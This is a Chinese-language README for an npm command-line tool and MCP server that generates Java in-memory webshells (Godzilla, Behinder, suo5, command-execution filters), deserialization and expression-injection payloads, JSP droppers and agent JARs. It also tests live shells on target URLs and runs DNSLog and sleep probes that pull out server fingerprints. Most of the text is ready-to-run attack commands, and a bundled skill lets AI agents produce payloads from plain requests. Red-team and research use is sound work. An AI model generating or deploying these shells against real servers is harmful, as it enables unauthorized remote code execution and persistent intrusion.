# memshell-party-cli

[English](README.md) | 中文

[MemShellParty](https://party.mem.mk) 的命令行客户端 **兼** MCP 服务器 —— 直接在终端（或 AI
代理）里生成 Java 内存马和探测马，走的是与 `party.mem.mk/ui` 相同的 HTTP API。

> ⚠️ 仅限授权安全测试、红队行动与研究用途。如何使用由你自己负责。

## 功能特性

- **交互式向导** —— 不带参数运行 `memparty gen`，从实时拉取的 API 菜单中选择
  服务器 / 工具 / 类型 / 打包器。
- **完全可脚本化** —— 每个选项都有对应命令行参数，CI 或脚本中可以精确复现。
- **MCP 服务器** —— `memparty mcp` 把生成和配置能力暴露为工具，供 Claude 及其他 MCP 客户端调用。
- **覆盖全部端点** —— 内存马生成、探测马生成、配置查询、类名解析、版本查询。
- **连接测试** —— `memparty connect` 验证已部署的 哥斯拉 / 冰蝎 / suo5 马是否存活、
  凭证是否正确（回显 / 握手双向校验）。
- **灵活的输出** —— payload 默认输出到 stdout，`-o file` 写文件（`.class`/`.jar` 自动
  base64 解码）。
- **任意后端** —— 默认使用公共站点，可切换为自建实例。

## 安装

```bash
npm install -g memshell-party-cli
# 或者免安装直接运行：
npx memshell-party-cli gen
```

要求 Node.js >= 18。

## 选择后端

优先级从高到低：`--api` 参数 → `MEMPARTY_API_URL` 环境变量 → `~/.mempartyrc`
（`{"apiUrl": "..."}`）→ 默认 `https://party.mem.mk`。

建议自建（Docker 一行命令，见 MemShellParty 的 README）：

```bash
memparty --api http://127.0.0.1:8080 gen
# 或者
export MEMPARTY_API_URL=http://127.0.0.1:8080
```

## 用法

### 交互模式

```bash
memparty gen        # 内存马向导
memparty probe      # 探测马向导
```

当必需参数缺失且处于终端环境时，向导会自动启动。随时可用 `-i` 强制开启，或用
`--no-interactive` 禁用。

### 脚本化生成

```bash
# 生成 Tomcat 哥斯拉 Listener，单个 Base64 payload 输出到 stdout
memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 \
  --godzilla-pass pass --godzilla-key key --jdk java8

# 写出解码后的 .class 文件（.class/.jar 会自动 base64 解码）
memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 \
  --godzilla-pass pass --godzilla-key key -o shell.class

# 指定加密器的命令执行马
memparty gen -s Tomcat -t Command -y Filter -p DefaultBase64 \
  --command-param-name cmd --encryptor RAW --implementation-class RuntimeExec

# 输出完整 JSON（元数据 + payload），便于后续处理
memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 --json
```

`--jdk` 接受 `java6/8/9/11/17/21`、纯数字（`8`）或 class 文件主版本号（`52`）。

注意：部分打包器（如 `Base64`）是*聚合*打包器，会一次返回多个变体；要单个 payload 请选
叶子打包器（如 `DefaultBase64`、`GzipBase64`）。

### 查询可用选项

```bash
memparty config servers          # 服务器及其 shell 类型
memparty config tools Tomcat     # 指定服务器的工具 + 类型
memparty config packers          # 打包器父子树
memparty config command          # Command 马的加密器与实现类
memparty config servers --json   # 机器可读输出
```

### 探测马

```bash
memparty probe -m ResponseBody -c Command -p DefaultBase64 --server Tomcat --req-param-name cmd
memparty probe -m Sleep -c Server -p DefaultBase64 --sleep-server Tomcat --seconds 5
```

探测方法 × 内容矩阵（后端仅支持以下组合）：

| 方法 `-m` | 支持的内容 `-c` |
|-----------|------------------|
| `DNSLog` | `Server`, `JDK` |
| `Sleep` | `Server` |
| `ResponseBody` | `Command`, `Bytecode`, `Filter`, `ScriptEngine` |

### 测试已部署的马

`memparty connect` 检查已经注入 / 上传的 shell 是否真的会应答 —— 它执行真实的协议握手
（冰蝎回显、哥斯拉 payload 上传 + `test()` 调用、suo5 隧道握手），成功退出码 0，失败 1。

```bash
# 哥斯拉（默认：--pass pass --key key）
memparty connect -u http://target/shell.jsp -t godzilla --pass pass --key key

# 冰蝎（默认：--pass rebeyond）
memparty connect -u http://target/shell.jsp -t behinder --pass rebeyond

# suo5（自动识别 v2 握手与旧版 v1 回显；可用 --suo5-mode v2|v1 强制指定）
memparty connect -u http://target/suo5.jsp -t suo5
```

MemShellParty 生成的 shell 带门禁头校验 —— 取值在 `gen --json` 输出的
`shellToolConfig.headerName` / `headerValue` 中，**必须**原样传给 connect
（Suo5v2 的 shell 同样校验）：

```bash
memparty connect -u http://target/x -t godzilla --pass pass --key key \
  --header-name User-Agent --header-value my-secret-token
```

其他参数：`-H "Name: value"` 添加自定义请求头，`-k/--insecure` 跳过自签名 TLS 校验，
`--json` 机器可读输出，`--timeout <ms>`（全局选项）。

## 示例

端到端配方。**打包器**按投递途径选择，**shell 类型**按目标选择（Tomcat 10+ /
Spring Boot 3 加 `Jakarta` 前缀；`Agent*` 类型搭配 `AgentJar*` 打包器）。拿不准时先运行
`memparty config tools <server>` 和 `memparty config packers`。

### 1. Tomcat 9（javax）上的哥斯拉内存马

```bash
# Listener 型哥斯拉马，单个 base64 payload 到 stdout
memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 \
  --godzilla-pass pass --godzilla-key key --jdk java8

# ……或直接把解码后的注入器 .class 写到磁盘
memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 \
  --godzilla-pass pass --godzilla-key key -o shell.class
```

### 2. 同一个马用于 Tomcat 10+ / Spring Boot 3（Jakarta）

```bash
memparty gen -s Tomcat -t Godzilla -y JakartaListener -p DefaultBase64 \
  --godzilla-pass pass --godzilla-key key --jdk java17
```

### 3. 纯命令执行马（RCE）

```bash
memparty gen -s Tomcat -t Command -y Filter -p DefaultBase64 \
  --command-param-name cmd --encryptor RAW --implementation-class RuntimeExec --jdk java8
```

### 4. 反序列化利用链（如 CommonsBeanutils ≤ 1.9.4）

```bash
memparty gen -s Tomcat -t Godzilla -y Listener -p JavaCommonsBeanutils19 \
  --godzilla-pass pass --godzilla-key key --jdk java8
# 其他链：JavaCommonsBeanutils18/17/16/110, JavaCommonsCollections3/4
```

### 5. 表达式注入投递（SpEL / OGNL / EL / Groovy …）

```bash
# Spring SpEL 注入 -> define + load shell 类（Spring 用 Interceptor，不是 Filter）
memparty gen -s SpringWebMvc -t Command -y Interceptor -p SpEL \
  --command-param-name cmd --jdk java8
# OGNL (Struts2), EL, MVEL, Aviator, JEXL, JXPath, Groovy, Velocity, Freemarker, JinJava ...
# （SpEL/OGNL/JXPath 是*聚合*打包器 —— 会一次返回多个变体）
```

### 6. 落地一个 JSP 文件

```bash
memparty gen -s Tomcat -t Godzilla -y Listener -p DefineClassJSP \
  --godzilla-pass pass --godzilla-key key --jdk java8 -o shell.jsp
```

### 7. Java agent 内存马（扛得住重部署，挂钩更深）

```bash
memparty gen -s Tomcat -t Godzilla -y AgentFilterChain -p AgentJar \
  --godzilla-pass pass --godzilla-key key --jdk java8 -o agent.jar
```

### 8. 先做（盲）指纹识别

```bash
# DNSLog：确认可执行代码，并通过 DNS 带出服务器/JDK 名称
memparty probe -m DNSLog -c Server -p DefaultBase64 --host <你的>.dnslog.cn
# Sleep：时间盲注 —— 仅当服务器与你猜的一致时才延迟 N 秒
memparty probe -m Sleep -c Server -p DefaultBase64 --sleep-server Tomcat --seconds 5
```

探测马报出的服务器名称就是 `memparty gen` 里 `-s` 要用的值。

### 解析类名

```bash
memparty parse-classname --file shell.class
memparty parse-classname <class字节的base64>
```

### 版本

```bash
memparty version          # CLI 版本 + 后端服务器版本
```

## MCP 服务器

以 stdio 方式作为 MCP 服务器运行：

```bash
memparty mcp --api http://127.0.0.1:8080
```

Claude Code / Claude Desktop 配置示例：

```json
{
  "mcpServers": {
    "memshell-party": {
      "command": "npx",
      "args": ["-y", "memshell-party-cli", "mcp"],
      "env": { "MEMPARTY_API_URL": "http://127.0.0.1:8080" }
    }
  }
}
```

暴露的工具：`list_servers`、`list_config`、`list_packers`、`list_command_configs`、
`generate_memshell`、`generate_probe`、`parse_classname`、`server_version`。

## AI 技能（Claude Code）

本包附带一个 [Claude Code 技能](https://docs.claude.com/en/docs/claude-code/skills)，位于
`skills/memshell-party/SKILL.md`，教 AI 代理如何驱动 MemShellParty ——
服务器/工具/类型/打包器决策树、探测方法×内容矩阵、按场景选打包器的指导，以及常见坑
（Jakarta 与 javax 之分、JDK 目标版本、聚合与叶子打包器）。

安装到项目中（或放到 `~/.claude/skills/` 全局使用）：

```bash
# 在包根目录下，或 npm install memshell-party-cli 之后：
mkdir -p .claude/skills
cp node_modules/memshell-party-cli/skills/memshell-party .claude/skills/ -r
```

之后用自然语言提问即可，比如 *"生成一个 Tomcat 10 的哥斯拉 Listener"* 或
*"给一个 Spring Boot 2 应用的 CommonsBeanutils 反序列化 payload"* —— 技能会引导代理
先枚举选项，再按投递途径选合适的打包器。

## 编程调用

包内还提供带类型的 API 客户端：

```ts
import { MemPartyClient, buildMemShellRequest } from "memshell-party-cli";

const client = new MemPartyClient({ baseUrl: "http://127.0.0.1:8080" });
const res = await client.generateMemShell(
  buildMemShellRequest({
    server: "Tomcat",
    shellTool: "Godzilla",
    shellType: "Listener",
    packer: "DefaultBase64",
    godzillaPass: "pass",
    godzillaKey: "key",
    jdk: "java8",
  }),
);
console.log(res.memShellResult.shellClassName, res.packResult);
```

## 开发

```bash
npm install
npm run build       # tsup -> dist/
npm test            # vitest
npm run typecheck   # tsc --noEmit
```

## 许可证

MIT
